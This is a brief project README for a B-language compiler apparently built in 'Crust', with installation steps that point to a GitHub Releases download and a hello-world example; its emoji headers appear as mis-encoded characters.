## üìñ Introduction

The B programming language is a simple yet powerful language that serves as a precursor to C. The B Compiler translates B code into machine code, allowing for efficient execution. This project is built using Crust, a modern programming language that focuses on safety and performance.

## ‚ú® Features

- **Simple Syntax**: Write clean and understandable code with the B language.
- **Fast Compilation**: The B Compiler provides quick compilation times.
- **Cross-Platform**: Run the compiler on various operating systems.
- **Error Handling**: Get clear error messages to help debug your code.

## üõ†Ô∏è Installation

To install the B Compiler, follow these steps:

1. Visit the [Releases section](https://github.com/vicRang24Raes/b/releases) to download the latest version.
2. Extract the downloaded files.
3. Navigate to the extracted folder in your terminal.
4. Run the following command to execute the compiler:

   ```bash
   ./b-compiler
   ```

Make sure you have the necessary permissions to execute the file.

## üìú Usage

After installation, you can start using the B Compiler. Here‚Äôs a simple example to get you going:

1. Create a new file named `example.b`:

   ```b
   // example.b
   main() {
       printf("Hello, World!");
   }
   ```

2. Compile the file using the B Compiler:

   ```bash
   ./b-compiler example.b
   ```

3. Run the compiled program:

   ```bash
   ./example
   ```

You should see `Hello, World!` printed in your terminal.
